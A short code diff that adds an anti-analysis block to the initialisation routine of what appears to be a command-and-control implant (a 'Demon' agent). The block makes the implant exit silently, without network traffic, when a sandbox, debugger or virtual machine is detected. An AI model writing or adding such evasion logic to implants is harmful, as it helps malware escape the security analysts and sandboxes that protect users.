@@ -487,6 +487,18 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         }
     }
 
+#ifdef ANTI_ANALYSIS
+    /* Anti-analysis checks: exit silently if sandbox/debugger/VM detected */
+    {
+        ANTI_ANALYSIS_RESULT AnalysisResult = { 0 };
+        if ( AntiAnalysisCheck( &AnalysisResult ) ) {
+            PRINTF( "Anti-analysis detected environment (flags: 0x%04x). Exiting.\n", AnalysisResult.DetectionType )
+            /* Exit silently without any network traffic */
+            return;
+        }
+    }
+#endif
+
     if ( KArgs )
     {
 #if SHELLCODE
